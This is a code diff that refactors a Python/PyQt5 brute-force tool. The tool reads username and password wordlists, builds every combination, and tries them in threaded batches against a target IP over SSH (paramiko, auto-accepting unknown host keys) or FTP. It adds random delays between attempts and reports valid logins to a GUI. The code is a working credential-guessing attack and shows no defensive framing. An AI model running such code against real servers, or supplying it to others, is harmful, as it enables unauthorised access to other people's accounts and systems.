@@ -1,5 +1,7 @@
+## NOTENOTE: Just write the combos to a file... its easier
+
 from PyQt5.QtCore import QRunnable, Qt, QThreadPool, QObject, QThread, pyqtSignal
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
 
 import time
 import random
@@ -8,10 +10,14 @@ import numpy as np
 import sqlite3
 import os
 import queue
+        
+import itertools  
 
 ## Connection Libs
 from ftplib import FTP
 import paramiko
+paramiko.util.log_to_file("main_paramiko_log.txt", level = "INFO") ## Tells paramiko to shut up
+
 
 import Modules.General.utility as utility
 
@@ -68,7 +74,14 @@ class Bruteforce(QObject):
             file = file_read_bytes.decode(decode_type)
             #file = file_raw.decode('utf-8')
             return file
-    
+        
+    def generate_creds(self, usernames, passwords):
+        for username in usernames:
+            for password in passwords:
+                yield (username, password)
+             
+    def worker(self, creds):
+        pass
     def bruteforce_framework(self, input_list):
         try:
             print("STARTED BF")
@@ -80,13 +93,13 @@ class Bruteforce(QObject):
             
             ## Breaking the list up
             
-            ip = input_list[0]
-            port = input_list[1]
+            self.IP = input_list[0]
+            self.port = input_list[1]
             protocol = input_list[2]
             user_wordlist_dir = input_list[3]
             pass_wordlist_dir = input_list[4]
-            delay = input_list[5]
-            max_threads = input_list[6]
+            self.delay = input_list[5]
+            self.max_threads = input_list[6]
             
             
             user_list = []
@@ -99,92 +112,75 @@ class Bruteforce(QObject):
             
             
             ## Creating target list - I know I could just use the input_list, however this cuts down on the amount of arguments I need to enter in each method
-            target_list = [ip, port, delay]
+            #target_list = [ip, port, delay]
             
         except Exception as e:
             print(e)
             #self.error(e,"??","??")
             exit()
+
+        username = self.fileopen(user_wordlist_dir)
+        password = self.fileopen(pass_wordlist_dir)
+                    
+        user_list_len = username.split()
+        pass_list_len = password.split()
+        self.total_combos = len(user_list_len) * len(pass_list_len)
+            
+        userpass_combo = itertools.product(username.split(),password.split())
         
+        print("Starting Batch")
+        batch_size = 10
+        for i in range(0, len(user_list_len) * len(pass_list_len), batch_size):
+            batch = list(itertools.islice(userpass_combo, batch_size))
+  
+        ## Deciding which processor to use     
+            if protocol == "SSH":
+                self.ssh_processor(batch)
+            if protocol == "FTP":
+                self.ftp_processor(batch)
+
         
-        ## FTP
-        if protocol == "FTP":
-            import itertools
-                           
-            username = self.fileopen(user_wordlist_dir)
-            password = self.fileopen(pass_wordlist_dir)
-                    
-            
-            user_list_len = username.split()
-            pass_list_len = password.split()
-            self.total_combos = len(user_list_len) * len(pass_list_len)
-            
-            
-            print("Generator")
-            user_list = (x for x in username.split())
-            pass_list = (x for x in password.split())
-
-           
+                
+                
+                ## Add a wait until batch is done
+                #if self.done:
+                    #continue
             #self.total_combos = 10
-            #userpass_combo = itertools.product(username.split(),password.split())
-            print("starting threadexe")
 
-            with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            
+    def ssh_processor(self, batch):
+        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
+            for i in batch:
                 ## Max workers needs fine tunning/an option for how many threads
-                for username in user_list:
-                    for password in pass_list:
-                        creds = (username, password)
-                        ftp_thread = executor.submit(self.ftp, target_list, creds)
-                
-                ftp_thread.result()
-                
-                self.H.sys_notification(["TITLE","FTP Bruteforce Completed\n3 valid credentials found!"])
-                print("DONE BRUTEFORCING")
-                
-        if protocol == "SSH":
-            import itertools
-                           
-            username = self.fileopen(user_wordlist_dir)
-            password = self.fileopen(pass_wordlist_dir)
+                ## Generator to help cut down on ram usage
+                print(i)
+                ssh_thread = executor.submit(self.ssh, i)
                     
-            
-            user_list_len = username.split()
-            pass_list_len = password.split()
-            self.total_combos = len(user_list_len) * len(pass_list_len)
-            
-            
-            print("Generator")
-            user_list = (x for x in username.split())
-            pass_list = (x for x in password.split())
+            print("BatchDone")
+            ssh_thread.result()
+            self.done = True
+            #self.H.sys_notification(["TITLE",f"FTP Bruteforce Completed\n {len(self.good_creds)} valid credential(s) found!"])
 
-           
-            #self.total_combos = 10
-            #userpass_combo = itertools.product(username.split(),password.split())
-            print("starting threadexe")
-
-            with ThreadPoolExecutor(max_workers=max_threads) as executor:
+    def ftp_processor(self, batch):
+        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
+            for i in batch:
                 ## Max workers needs fine tunning/an option for how many threads
-                for username in user_list:
-                    for password in pass_list:
-                        creds = (username, password)
-                        ssh_thread = executor.submit(self.ssh, target_list, creds)
-                
-                ssh_thread.result()
-                #print("DONE BRUTEFORCING")
+                ## Generator to help cut down on ram usage
+                print(i)
+                ftp_thread = executor.submit(self.ftp, i)
                     
+            print("BatchDone")
+            ftp_thread.result()
+            self.done = True
 
-    
-    def ftp(self, target_list, creds):
-        IP = target_list[0]
-        port = target_list[1]
-        delay = target_list[2]
+    def ftp(self, creds):
         username = creds[0]
         password = creds[1]
         
         try:
-            time.sleep(random.randint(0,delay))
+            time.sleep(random.randint(0,self.delay))
             
-            ftp = FTP(IP, timeout=.1)
+            ftp = FTP(self.IP, timeout=10)
             ftp.login(username, password)
             ftp.close() ## Close is a bit harsher than quit, but quits it asap
             
@@ -201,28 +197,25 @@ class Bruteforce(QObject):
         finally:
             ftp.close()
 
-        self.bruteforce_progress = self.bruteforce_progress + 1
-        self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
+            self.bruteforce_progress = self.bruteforce_progress + 1
+            self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
         
-        ## Live update in GUI
+            ## Live update in GUI, if num is 0 it was unsuccessful
         self.number = self.number + 1
         if self.number == 1:
             self.live_attempts.emit(username + ":" + password)
             self.number = 0
 
-    def ssh(self, target_list, creds):
-        IP = target_list[0]
-        port = target_list[1]
-        delay = target_list[2]
+    def ssh(self, creds):
+
         _username = creds[0] # _ for namespace reasons
         _password = creds[1]
         
         try:
-            time.sleep(random.randint(0,delay))
-            
+            time.sleep(random.randint(0,self.delay))
             client = paramiko.client.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ## Ignoring known hosts
-            client.connect(IP, username=_username, password=_password, timeout=10, banner_timeout=200)
+            client.connect(self.IP, username=_username, password=_password, timeout=10, banner_timeout=200)
             client.close()
             
             self.success(_username, _password)
@@ -236,14 +229,15 @@ class Bruteforce(QObject):
             #self.error(e,"low","testerror")
         
         finally:
-            client.close()
+            #client.close()
 
-        self.bruteforce_progress = self.bruteforce_progress + 1
-        self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
+            self.bruteforce_progress = self.bruteforce_progress + 1
+            self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
         
-        ## Live update in GUI
+            ## Live update in GUI
         self.number = self.number + 1
         if self.number == 1:
+            print(_username + _password)
             self.live_attempts.emit(_username + ":" + _password)
             self.number = 0
 
